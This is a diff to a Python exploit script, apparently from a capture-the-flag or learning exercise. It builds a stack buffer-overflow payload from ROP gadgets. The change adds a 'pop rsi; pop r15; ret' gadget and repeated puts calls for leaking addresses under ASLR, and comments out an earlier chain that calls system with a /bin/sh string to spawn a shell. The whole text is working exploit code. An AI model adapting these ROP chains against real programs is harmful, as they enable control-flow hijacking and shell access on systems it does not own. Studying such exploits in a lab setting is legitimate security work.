@@ -52,13 +52,21 @@ rop_pop_rdi_ret = b"\x00\x00\x00\x00\x00\x40\x12\x03"[::-1]
 
 rop_puts = b"\x00\x00\x00\x00\x00\x40\x10\x30"[::-1]
 
+# 0x0000000000401201: pop rsi; pop r15; ret;
+double_pop_ret = b"\x00\x00\x00\x00\x00\x40\x12\x01"[::-1]
+
+
 payload = (
     buffer
     + backup_base_pointer
-    + rop_pop_rdi_ret
-    + bin_sh_string
-    + system_call
-    + exit_call
+    + double_pop_ret
+    + rop_puts  # works with aslr.
+    + rop_puts  # works with aslr.
+    + rop_puts  # works with aslr.
+    # + rop_pop_rdi_ret  # works with aslr.
+    # + bin_sh_string  # broken by aslr.
+    # + system_call  # broken by aslr.
+    # + exit_call  # broken by aslr.
 )
 
 f = open("payload", "wb")
